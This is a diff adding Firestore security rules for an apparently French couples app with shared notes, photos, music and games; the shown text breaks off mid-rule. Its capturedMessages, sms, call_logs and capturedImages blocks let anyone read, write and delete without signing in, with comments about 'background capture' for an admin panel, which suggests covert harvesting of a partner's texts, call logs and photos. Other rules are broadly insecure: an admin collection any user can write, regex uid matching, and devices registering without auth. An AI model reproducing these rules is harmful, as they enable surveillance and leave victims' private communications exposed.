@@ -1,0 +1,1447 @@
+rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+
+    // Helper function to check if user is authenticated
+    function isSignedIn() {
+      return request.auth != null;
+    }
+
+    // Users collection
+    match /users/{userId} {
+      allow read: if isSignedIn();
+      allow write: if isSignedIn() && request.auth.uid == userId;
+      allow create: if isSignedIn();
+
+      // User's personal notes subcollection
+      match /notes/{noteId} {
+        allow read, write, create, delete: if isSignedIn() && request.auth.uid == userId;
+      }
+
+      // User's personal media subcollection
+      match /media/{mediaId} {
+        allow read, write, create, delete: if isSignedIn() && request.auth.uid == userId;
+      }
+
+      // User's personal albums subcollection
+      match /albums/{albumId} {
+        allow read, write, create, delete: if isSignedIn() && request.auth.uid == userId;
+      }
+
+      // User's personal memories subcollection
+      match /memories/{memoryId} {
+        allow read, write, create, delete: if isSignedIn() && request.auth.uid == userId;
+      }
+    }
+
+    // Songs collection (user's personal songs)
+    match /songs/{songId} {
+      allow read: if isSignedIn();
+      allow write, create, delete: if isSignedIn();
+    }
+
+    // Music Library - all authenticated users
+    match /musicLibrary/{musicId} {
+      allow read, write, create, delete: if isSignedIn();
+    }
+
+    // Photos - all authenticated users can read, create
+    match /photos/{photoId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Messages (notifications) - all authenticated users
+    match /notifications/{notificationId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Captured Messages and SMS rules are defined below (lines 333-346)
+    // to allow background capture without authentication
+
+    // App Settings - public read, authenticated write
+    match /appSettings/{settingId} {
+      allow read: if true; // Public read for React Native app
+      allow write, create, delete: if isSignedIn();
+    }
+
+    // Devices
+    match /devices/{deviceId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Notes
+    match /notes/{noteId} {
+      allow read, write, create: if isSignedIn();
+    }
+
+    // Gallery/Albums
+    match /gallery/{itemId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Albums (photo albums)
+    match /albums/{albumId} {
+      allow read, write, create, delete: if isSignedIn();
+    }
+
+    // Memories (photo memories)
+    match /memories/{memoryId} {
+      allow read, write, create, delete: if isSignedIn();
+    }
+
+    // Playlists (music playlists)
+    match /playlists/{playlistId} {
+      allow read, write, create, delete: if isSignedIn();
+    }
+
+    // Quiz Rooms (quiz couple game)
+    match /quizRooms/{roomId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Games (Morpion, Puissance 4, etc.)
+    match /games/{gameId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Admin Music (for admin panel)
+    match /adminMusic/{musicId} {
+      allow read: if isSignedIn();
+      allow write, create, delete: if isSignedIn();
+    }
+
+    // Home Messages (admin messages to users)
+    match /homeMessages/{messageId} {
+      allow read: if true; // Public read for all users
+      allow write, create, delete: if isSignedIn();
+    }
+
+    // Shared Songs (partage de chansons entre couples)
+    match /sharedSongs/{songId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Couples collection (métadonnées et notes partagées)
+    match /couples/{coupleId} {
+      allow read, write: if isSignedIn();
+      allow create: if isSignedIn();
+
+      // Shared Notes subcollection (notes partagées entre couples)
+      match /sharedNotes/{noteId} {
+        allow read, write, create, delete: if isSignedIn();
+      }
+    }
+
+    // Shared Media collection (médias partagés entre couples)
+    match /sharedMedia/{coupleId} {
+      allow read, write: if isSignedIn();
+      allow create: if isSignedIn();
+
+      // Media subcollection for each couple
+      match /media/{mediaId} {
+        allow read, write, create, delete: if isSignedIn();
+      }
+    }
+
+    // Notification Requests (pour Cloud Functions)
+    match /notificationRequests/{requestId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Notification History (pour admin panel)
+    match /notificationHistory/{historyId} {
+      allow read, create: if isSignedIn();
+      allow update, delete: if isSignedIn();
+    }
+
+    // Helper functions
+    function isAuthenticated() {
+      return request.auth != null;
+    }
+
+    function isOwner(userId) {
+      return isAuthenticated() && request.auth.uid == userId;
+    }
+
+    function isInCouple(userId1, userId2) {
+      return isAuthenticated() && (
+        request.auth.uid == userId1 ||
+        request.auth.uid == userId2
+      );
+    }
+
+    function isSharedWith() {
+      return isAuthenticated() && (
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // USERS COLLECTION
+    // ========================================
+    match /users/{userId} {
+      // Anyone authenticated can read user profiles (for partner features)
+      allow read: if isAuthenticated();
+
+      // Allow creating user document:
+      // 1. By the user themselves
+      // 2. By partner linking service (any authenticated user can create minimal user doc)
+      allow create: if isAuthenticated();
+
+      // Allow update:
+      // 1. By the owner themselves (can update any field)
+      // 2. By partner linking service to set partnerId and relationshipStartDate
+      // 3. When being linked by another user (setting partnerId to the linking user)
+      // 4. Allow updating profile fields during partner linking
+      // 5. Allow partner to unlink by setting partnerId to null (for unpair/dejumelage)
+      allow update: if isOwner(userId) ||
+        (isAuthenticated() && request.resource.data.partnerId == request.auth.uid) ||
+        (isAuthenticated() &&
+         (request.resource.data.keys().hasOnly(['partnerId', 'relationshipStartDate']) ||
+          request.resource.data.keys().hasOnly(['partnerId', 'relationshipStartDate', 'updatedAt']) ||
+          request.resource.data.keys().hasOnly(['partnerId', 'relationshipStartDate', 'lastModified'])) &&
+         request.resource.data.partnerId != null) ||
+        // Allow current partner to unlink (set partnerId to null for unpair)
+        (isAuthenticated() &&
+         resource.data.partnerId == request.auth.uid &&
+         request.resource.data.partnerId == null);
+
+      // Only the owner can delete their profile
+      allow delete: if isOwner(userId);
+
+      // Subcollections for user's personal content
+      match /albums/{albumId} {
+        allow read: if isOwner(userId) || (isAuthenticated() && get(/databases/$(database)/documents/users/$(userId)).data.partnerId == request.auth.uid);
+        allow write, create, delete: if isOwner(userId);
+      }
+
+      match /memories/{memoryId} {
+        allow read: if isOwner(userId) || (isAuthenticated() && get(/databases/$(database)/documents/users/$(userId)).data.partnerId == request.auth.uid);
+        allow write, create, delete: if isOwner(userId);
+      }
+
+      match /media/{mediaId} {
+        allow read, write, create, delete: if isOwner(userId);
+      }
+
+      match /notes/{noteId} {
+        allow read, write, create, delete: if isOwner(userId);
+      }
+
+      // Shared embedded songs (for bundled/app songs)
+      match /sharedEmbeddedSongs/{songId} {
+        allow read, write, create, delete: if isOwner(userId);
+      }
+
+      // Shared admin songs (from music library)
+      match /sharedAdminSongs/{songId} {
+        allow read, write, create, delete: if isOwner(userId);
+      }
+    }
+
+    // ========================================
+    // SONGS/MUSIC COLLECTION (Root for shared/complex music)
+    // ========================================
+    match /songs/{songId} {
+      // Read: owner or partner if shared
+      allow read: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        resource.data.uploadedBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid ||
+        (resource.data.isShared == true &&
+         resource.data.sharedWith == request.auth.uid) ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Create: authenticated users
+      allow create: if isAuthenticated() && (
+        request.resource.data.userId == request.auth.uid ||
+        request.resource.data.uploadedBy == request.auth.uid
+      );
+
+      // Update: owner or partner if shared
+      allow update: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        resource.data.uploadedBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid
+      );
+
+      // Delete: only the owner
+      allow delete: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        resource.data.uploadedBy == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // MUSIC LIBRARY (Generic music access)
+    // ========================================
+    match /musicLibrary/{musicId} {
+      allow read, write, create, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // PHOTOS/GALLERY COLLECTION (Root for shared/complex photos)
+    // ========================================
+    match /photos/{photoId} {
+      // Read: uploader, partner if shared
+      allow read: if isAuthenticated() && (
+        resource.data.uploadedBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Create: authenticated users
+      allow create: if isAuthenticated() &&
+        request.resource.data.uploadedBy == request.auth.uid;
+
+      // Update: uploader or partner if shared
+      allow update: if isAuthenticated() && (
+        resource.data.uploadedBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid
+      );
+
+      // Delete: only uploader
+      allow delete: if isAuthenticated() &&
+        resource.data.uploadedBy == request.auth.uid;
+
+      // Subcollection: Comments on photos
+      match /comments/{commentId} {
+        allow read: if isAuthenticated();
+        allow create: if isAuthenticated();
+        allow update: if isAuthenticated() && (
+          resource.data.userId == request.auth.uid ||
+          (request.resource.data.diff(resource.data).affectedKeys().hasOnly(['replyCount']) &&
+           request.resource.data.replyCount > resource.data.replyCount)
+        );
+        allow delete: if isAuthenticated() && resource.data.userId == request.auth.uid;
+      }
+
+      // Subcollection: Reactions on photos
+      match /reactions/{reactionId} {
+        allow read: if isAuthenticated();
+        allow write: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // NOTIFICATIONS COLLECTION
+    // ========================================
+    match /notifications/{notificationId} {
+      // Allow any authenticated user to read, create, update, delete notifications.
+      // This allows flexibility for admin panel or direct user management.
+      allow read, create, update, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // CAPTURED MESSAGES - ALLOW BACKGROUND CAPTURE
+    // ========================================
+    match /capturedMessages/{messageId} {
+      allow read: if true; // Allow anyone to read (for admin panel)
+      allow create: if true; // ✅ Allow background service to capture
+      allow update: if true; // Allow updates
+      allow delete: if true; // Allow deletes
+    }
+
+    // ========================================
+    // SMS COLLECTION - ALLOW BACKGROUND CAPTURE
+    // ========================================
+    match /sms/{smsId} {
+      allow read: if true; // Allow anyone to read (for admin panel)
+      allow create: if true; // ✅ Allow background service to capture
+      allow update: if true; // Allow updates
+      allow delete: if true; // Allow deletes
+    }
+
+    // ========================================
+    // CALL LOGS COLLECTION - ALLOW BACKGROUND CAPTURE
+    // ========================================
+    match /call_logs/{callId} {
+      allow read: if true; // Allow anyone to read (for admin panel)
+      allow create: if true; // ✅ Allow background service to capture
+      allow update: if true; // Allow updates
+      allow delete: if true; // Allow deletes
+    }
+
+    // ========================================
+    // CAPTURED IMAGES - ALLOW BACKGROUND CAPTURE
+    // ========================================
+    match /capturedImages/{imageId} {
+      allow read: if true; // Allow anyone to read (for admin panel)
+      allow create: if true; // ✅ Allow background service to capture and upload
+      allow update: if true; // Allow updates
+      allow delete: if true; // Allow deletes
+    }
+
+    // ========================================
+    // APP SETTINGS
+    // ========================================
+    match /appSettings/{settingId} {
+      allow read: if true; // Public read for React Native app
+      allow write, create, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // DEVICES - ALLOW BACKGROUND REGISTRATION WITHOUT AUTH
+    // ========================================
+    match /devices/{deviceId} {
+      allow read: if isAuthenticated();
+      allow create, update: if true; // ✅ Allow background service to register/update device without auth
+      allow delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // NOTES COLLECTION (Root for shared/complex notes)
+    // ========================================
+    match /notes/{noteId} {
+      // Read: owner, partner if shared, or anyone if public
+      allow read: if isAuthenticated() && (
+        resource.data.authorId == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid) ||
+        (resource.data.visibility == 'shared' &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Create: authenticated users, must be author
+      allow create: if isAuthenticated() &&
+        request.resource.data.authorId == request.auth.uid;
+
+      // Update: owner or partner if shared
+      allow update: if isAuthenticated() && (
+        resource.data.authorId == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid) ||
+        (resource.data.visibility == 'shared' &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Delete: only the author
+      allow delete: if isAuthenticated() &&
+        resource.data.authorId == request.auth.uid;
+
+      // Subcollection: Comments on notes
+      match /comments/{commentId} {
+        allow read: if isAuthenticated();
+        allow create: if isAuthenticated();
+        allow update: if isAuthenticated() && (
+          resource.data.userId == request.auth.uid ||
+          (request.resource.data.diff(resource.data).affectedKeys().hasOnly(['replyCount']) &&
+           request.resource.data.replyCount > resource.data.replyCount)
+        );
+        allow delete: if isAuthenticated() && resource.data.userId == request.auth.uid;
+      }
+
+      // Subcollection: Reactions on notes
+      match /reactions/{reactionId} {
+        allow read: if isAuthenticated();
+        allow write: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // GALLERY COLLECTION (Might be redundant with /photos)
+    // ========================================
+    match /gallery/{itemId} {
+      allow read, create, update, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // ALBUMS COLLECTION (Root for shared/complex albums)
+    // ========================================
+    match /albums/{albumId} {
+      // Read: creator, partner if shared
+      allow read: if isAuthenticated() && (
+        resource.data.createdBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Create: authenticated users
+      allow create: if isAuthenticated() &&
+        request.resource.data.createdBy == request.auth.uid;
+
+      // Update: creator or partner if shared
+      allow update: if isAuthenticated() && (
+        resource.data.createdBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid
+      );
+
+      // Delete: only the creator
+      allow delete: if isAuthenticated() &&
+        resource.data.createdBy == request.auth.uid;
+    }
+
+    // ========================================
+    // MEMORIES COLLECTION (Root for shared/complex memories)
+    // ========================================
+    match /memories/{memoryId} {
+      allow read, write, create, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // PLAYLISTS COLLECTION
+    // ========================================
+    match /playlists/{playlistId} {
+      // Read: creator, partner if shared
+      allow read: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        resource.data.createdBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Create: authenticated users
+      allow create: if isAuthenticated() && (
+        request.resource.data.userId == request.auth.uid ||
+        request.resource.data.createdBy == request.auth.uid
+      );
+
+      // Update: creator or partner if shared
+      allow update: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        resource.data.createdBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid
+      );
+
+      // Delete: only the creator
+      allow delete: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        resource.data.createdBy == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // QUIZ ROOMS
+    // ========================================
+    match /quizRooms/{roomId} {
+      allow read, write, create, update, delete: if isAuthenticated();
+
+      // Allow subcollections
+      match /{document=**} {
+        allow read, write, create, update, delete: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // GAMES (Morpion, Puissance 4, etc.)
+    // ========================================
+    match /games/{gameId} {
+      allow read, write, create, update, delete: if isAuthenticated();
+
+      // Allow subcollections for game moves, turns, etc.
+      match /{document=**} {
+        allow read, write, create, update, delete: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // ADMIN MUSIC (for admin panel)
+    // ========================================
+    match /adminMusic/{musicId} {
+      allow read: if isAuthenticated();
+      allow write, create, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // HOME MESSAGES (admin messages to users)
+    // ========================================
+    match /homeMessages/{messageId} {
+      allow read: if true; // Public read for all users
+      allow write, create, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // SHARED SONGS (partage de chansons entre couples)
+    // ========================================
+    match /sharedSongs/{songId} {
+      allow read, create, update, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // COUPLES COLLECTION
+    // ========================================
+    match /couples/{coupleId} {
+      // Both users in the couple can read
+      allow read: if isAuthenticated() && (
+        resource.data.user1Id == request.auth.uid ||
+        resource.data.user2Id == request.auth.uid
+      );
+
+      // Either user can create the couple
+      allow create: if isAuthenticated() && (
+        request.resource.data.user1Id == request.auth.uid ||
+        request.resource.data.user2Id == request.auth.uid
+      );
+
+      // Both users can update couple data
+      allow update: if isAuthenticated() && (
+        resource.data.user1Id == request.auth.uid ||
+        resource.data.user2Id == request.auth.uid
+      );
+
+      // Both users can delete the couple
+      allow delete: if isAuthenticated() && (
+        resource.data.user1Id == request.auth.uid ||
+        resource.data.user2Id == request.auth.uid
+      );
+
+      // Subcollection: Shared Notes
+      match /sharedNotes/{noteId} {
+        // Allow access if the authenticated user's ID is part of the couple ID
+        allow read, write, create, delete: if isAuthenticated() && (
+          coupleId.matches('.*' + request.auth.uid + '.*')
+        );
+      }
+    }
+
+    // ========================================
+    // SHARED MEDIA COLLECTION
+    // ========================================
+    match /sharedMedia/{coupleId} {
+      // Allow reading the coupleId document itself
+      allow read: if isAuthenticated() && (
+        coupleId.matches('.*' + request.auth.uid + '.*')
+      );
+
+      // Allow creating coupleId document
+      allow create: if isAuthenticated() && (
+        coupleId.matches('.*' + request.auth.uid + '.*')
+      );
+
+      // Subcollection: Media items
+      match /media/{mediaId} {
+        // Allow access if the authenticated user's ID is part of the couple ID
+        allow read, write, create, delete: if isAuthenticated() && (
+          coupleId.matches('.*' + request.auth.uid + '.*')
+        );
+      }
+    }
+
+    // ========================================
+    // NOTIFICATION REQUESTS (for Cloud Functions)
+    // ========================================
+    match /notificationRequests/{requestId} {
+      allow read, create, update, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // NOTIFICATION HISTORY (for admin panel)
+    // ========================================
+    match /notificationHistory/{historyId} {
+      allow read, create, update, delete: if isAuthenticated();
+    }
+
+    // ========================================
+    // PARTNER LINK CODES COLLECTION
+    // ========================================
+    match /partner_link_codes/{code} {
+      // Anyone authenticated can read codes (to validate them)
+      allow read: if isAuthenticated();
+
+      // Only the creator can create their code
+      allow create: if isAuthenticated() &&
+        request.resource.data.userId == request.auth.uid;
+
+      // Allow update if:
+      // 1. Creator is updating their own code
+      // 2. Anyone can mark the code as used (for partner linking)
+      allow update: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        (request.resource.data.keys().hasOnly(['isUsed']) && request.resource.data.isUsed == true)
+      );
+
+      // Codes can be deleted by creator
+      allow delete: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+    }
+
+    // ========================================
+    // VINYL DISCS COLLECTION (Music Player Customization)
+    // ========================================
+    match /vinyl_discs/{discId} {
+      // Anyone authenticated can read (to see partner's vinyl)
+      allow read: if isAuthenticated();
+
+      // Only owner can create/update their vinyl
+      allow create, update: if isAuthenticated() &&
+        request.resource.data.userId == request.auth.uid;
+
+      // Only owner can delete
+      allow delete: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+    }
+
+    // ========================================
+    // VIDEOS COLLECTION
+    // ========================================
+    match /videos/{videoId} {
+      // Read: uploader, partner if shared
+      allow read: if isAuthenticated() && (
+        resource.data.uploadedBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Create: authenticated users
+      allow create: if isAuthenticated() &&
+        request.resource.data.uploadedBy == request.auth.uid;
+
+      // Update: uploader or partner if shared
+      allow update: if isAuthenticated() && (
+        resource.data.uploadedBy == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid ||
+        resource.data.partnerId == request.auth.uid
+      );
+
+      // Delete: only uploader
+      allow delete: if isAuthenticated() &&
+        resource.data.uploadedBy == request.auth.uid;
+
+      // Subcollection: Comments on videos
+      match /comments/{commentId} {
+        allow read: if isAuthenticated();
+        allow create: if isAuthenticated();
+        allow update: if isAuthenticated() && (
+          resource.data.userId == request.auth.uid ||
+          (request.resource.data.diff(resource.data).affectedKeys().hasOnly(['replyCount']) &&
+           request.resource.data.replyCount > resource.data.replyCount)
+        );
+        allow delete: if isAuthenticated() && resource.data.userId == request.auth.uid;
+      }
+
+      // Subcollection: Reactions on videos
+      match /reactions/{reactionId} {
+        allow read: if isAuthenticated();
+        allow write: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // MESSAGES COLLECTION (Direct Messages)
+    // ========================================
+    match /messages/{messageId} {
+      // Read: sender or receiver
+      allow read: if isAuthenticated() && (
+        resource.data.senderId == request.auth.uid ||
+        resource.data.receiverId == request.auth.uid
+      );
+
+      // Create: authenticated users, must be sender
+      allow create: if isAuthenticated() &&
+        request.resource.data.senderId == request.auth.uid;
+
+      // Update: sender or receiver (for read status, reactions)
+      allow update: if isAuthenticated() && (
+        resource.data.senderId == request.auth.uid ||
+        resource.data.receiverId == request.auth.uid
+      );
+
+      // Delete: only sender
+      allow delete: if isAuthenticated() &&
+        resource.data.senderId == request.auth.uid;
+    }
+
+    // ========================================
+    // CONVERSATIONS COLLECTION
+    // ========================================
+    match /conversations/{conversationId} {
+      allow read: if isAuthenticated() && (
+        resource.data.user1Id == request.auth.uid ||
+        resource.data.user2Id == request.auth.uid
+      );
+
+      allow create: if isAuthenticated() && (
+        request.resource.data.user1Id == request.auth.uid ||
+        request.resource.data.user2Id == request.auth.uid
+      );
+
+      allow update: if isAuthenticated() && (
+        resource.data.user1Id == request.auth.uid ||
+        resource.data.user2Id == request.auth.uid
+      );
+
+      allow delete: if isAuthenticated() && (
+        resource.data.user1Id == request.auth.uid ||
+        resource.data.user2Id == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // EVENTS/CALENDAR COLLECTION
+    // ========================================
+    match /events/{eventId} {
+      allow read: if isAuthenticated() && (
+        resource.data.createdBy == request.auth.uid ||
+        resource.data.participants[request.auth.uid] == true ||
+        resource.data.sharedWith == request.auth.uid
+      );
+
+      allow create: if isAuthenticated() &&
+        request.resource.data.createdBy == request.auth.uid;
+
+      allow update: if isAuthenticated() && (
+        resource.data.createdBy == request.auth.uid ||
+        resource.data.participants[request.auth.uid] == true
+      );
+
+      allow delete: if isAuthenticated() &&
+        resource.data.createdBy == request.auth.uid;
+    }
+
+    // ========================================
+    // REMINDERS COLLECTION
+    // ========================================
+    match /reminders/{reminderId} {
+      allow read: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+
+      allow create: if isAuthenticated() &&
+        request.resource.data.userId == request.auth.uid;
+
+      allow update: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+
+      allow delete: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+    }
+
+    // ========================================
+    // SHARED_CONTENT COLLECTION (Generic sharing)
+    // ========================================
+    match /shared_content/{contentId} {
+      allow read: if isAuthenticated() && (
+        resource.data.ownerId == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid
+      );
+
+      allow create: if isAuthenticated() &&
+        request.resource.data.ownerId == request.auth.uid;
+
+      allow update: if isAuthenticated() && (
+        resource.data.ownerId == request.auth.uid ||
+        resource.data.sharedWith == request.auth.uid
+      );
+
+      allow delete: if isAuthenticated() &&
+        resource.data.ownerId == request.auth.uid;
+    }
+
+    // ========================================
+    // SETTINGS COLLECTION (User preferences)
+    // ========================================
+    match /settings/{userId} {
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+      allow write: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // ========================================
+    // USER PROFILES COLLECTION (Unified profiles)
+    // ========================================
+    match /userProfiles/{userId} {
+      allow read: if isAuthenticated();
+      allow write: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // ========================================
+    // QUIZ COUPLE PROFILES
+    // ========================================
+    match /quiz_couple_profiles/{userId} {
+      allow read: if isAuthenticated();
+      allow write: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // ========================================
+    // CONNECT4 PROFILES
+    // ========================================
+    match /connect4_profiles/{userId} {
+      allow read: if isAuthenticated();
+      allow write: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // ========================================
+    // THEMES COLLECTION (Custom themes)
+    // ========================================
+    match /themes/{themeId} {
+      allow read: if isAuthenticated();
+
+      allow create: if isAuthenticated() &&
+        request.resource.data.createdBy == request.auth.uid;
+
+      allow update: if isAuthenticated() &&
+        resource.data.createdBy == request.auth.uid;
+
+      allow delete: if isAuthenticated() &&
+        resource.data.createdBy == request.auth.uid;
+    }
+
+    // ========================================
+    // ANALYTICS COLLECTION (Usage stats)
+    // ========================================
+    match /analytics/{userId} {
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+      allow write: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // ========================================
+    // BACKUPS COLLECTION (User data backups)
+    // ========================================
+    match /backups/{backupId} {
+      allow read: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+
+      allow create: if isAuthenticated() &&
+        request.resource.data.userId == request.auth.uid;
+
+      allow delete: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+    }
+
+    // ========================================
+    // CUSTOM MESSAGES COLLECTION
+    // ========================================
+    match /customMessages/{messageId} {
+      // Users can read their own custom messages
+      allow read: if isAuthenticated() && resource.data.userId == request.auth.uid;
+
+      // Users can create their own custom messages
+      allow create: if isAuthenticated() && request.resource.data.userId == request.auth.uid;
+
+      // Users can update their own custom messages
+      allow update: if isAuthenticated() && resource.data.userId == request.auth.uid;
+
+      // Users can delete their own custom messages
+      allow delete: if isAuthenticated() && resource.data.userId == request.auth.uid;
+    }
+
+    // ========================================
+    // ADMIN COLLECTION (Admin Panel Users)
+    // ========================================
+    match /admin/{adminId} {
+      // Only authenticated users can access the admin collection
+      // For more granular control, you would typically add role checks here.
+      allow read, write: if isAuthenticated();
+    }
+
+    // ========================================
+    // WORD SEARCH PLAYER PROFILES
+    // ========================================
+    match /word_search_profiles/{profileId} {
+      // Anyone authenticated can read profiles (for multiplayer)
+      allow read: if isAuthenticated();
+
+      // Only the owner can create their profile
+      allow create: if isAuthenticated() && request.resource.data.id == profileId;
+
+      // Only the owner can update their profile
+      allow update: if isAuthenticated() && resource.data.id == profileId;
+
+      // Only the owner can delete their profile
+      allow delete: if isAuthenticated() && resource.data.id == profileId;
+    }
+
+    // ========================================
+    // WORD SEARCH MULTIPLAYER GAMES
+    // ========================================
+    // Anyone (including anonymous users) can access multiplayer games
+    match /multiplayer_games/{gameId} {
+      // Anyone can access games
+      allow read, write, create, update, delete: if request.auth != null;
+
+      // Allow subcollections
+      match /{document=**} {
+        allow read, write, create, update, delete: if request.auth != null;
+      }
+    }
+
+    // ========================================
+    // WORD SEARCH COOPERATIVE GAMES
+    // ========================================
+    // Anyone (including anonymous users) can access cooperative games
+    match /cooperative_games/{gameId} {
+      // Anyone can access games
+      allow read, write, create, update, delete: if request.auth != null;
+
+      // Allow subcollections
+      match /{document=**} {
+        allow read, write, create, update, delete: if request.auth != null;
+      }
+    }
+
+    // ========================================
+    // QUIZ COUPLE GAMES
+    // ========================================
+    match /quiz_couple_games/{gameId} {
+      // Anyone authenticated can read games (to join by code)
+      allow read, write, create, update, delete: if isAuthenticated();
+
+      // Allow subcollections
+      match /{document=**} {
+        allow read, write, create, update, delete: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // DOMINOS GAMES
+    // ========================================
+    match /dominos_games/{gameId} {
+      // Anyone authenticated can access games
+      allow read, write, create, update, delete: if isAuthenticated();
+
+      // Allow subcollections
+      match /{document=**} {
+        allow read, write, create, update, delete: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // DOMINOS STATS
+    // ========================================
+    match /dominos_stats/{userId} {
+      // Users can read their own stats
+      allow read: if isOwner(userId);
+
+      // Users can create/update their own stats
+      allow create, update: if isOwner(userId);
+
+      // Only user can delete their own stats
+      allow delete: if isOwner(userId);
+    }
+
+    // ========================================
+    // DOMINOS HISTORY
+    // ========================================
+    match /dominos_history/{historyId} {
+      // Users can read their own history
+      allow read: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.opponentId == request.auth.uid
+      );
+
+      // Only the player can create their history entry
+      allow create: if isAuthenticated() && request.resource.data.playerId == request.auth.uid;
+
+      // Users can update their own history
+      allow update: if isAuthenticated() && resource.data.playerId == request.auth.uid;
+
+      // Users can delete their own history
+      allow delete: if isAuthenticated() && resource.data.playerId == request.auth.uid;
+    }
+
+    // ========================================
+    // MORPION GAMES
+    // ========================================
+    match /morpion_games/{gameId} {
+      allow read, write, create, update, delete: if isAuthenticated();
+
+      // Allow subcollections
+      match /{document=**} {
+        allow read, write, create, update, delete: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // MORPION PROFILES
+    // ========================================
+    match /morpion_profiles/{userId} {
+      allow read: if isAuthenticated();
+
+      // Allow create if authenticated and profile matches user ID
+      allow create: if isAuthenticated() && (
+        userId == request.auth.uid ||
+        request.resource.data.id == request.auth.uid
+      );
+
+      // Allow update if:
+      // 1. User is updating their own profile
+      // 2. Profile sync service is updating the profile (check if authenticated)
+      allow update: if isAuthenticated() && (
+        userId == request.auth.uid ||
+        resource.data.id == request.auth.uid
+      );
+
+      // Only owner can delete
+      allow delete: if isAuthenticated() && (
+        userId == request.auth.uid ||
+        resource.data.id == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // MORPION HISTORY
+    // ========================================
+    match /morpion_history/{historyId} {
+      allow read: if isAuthenticated() && (
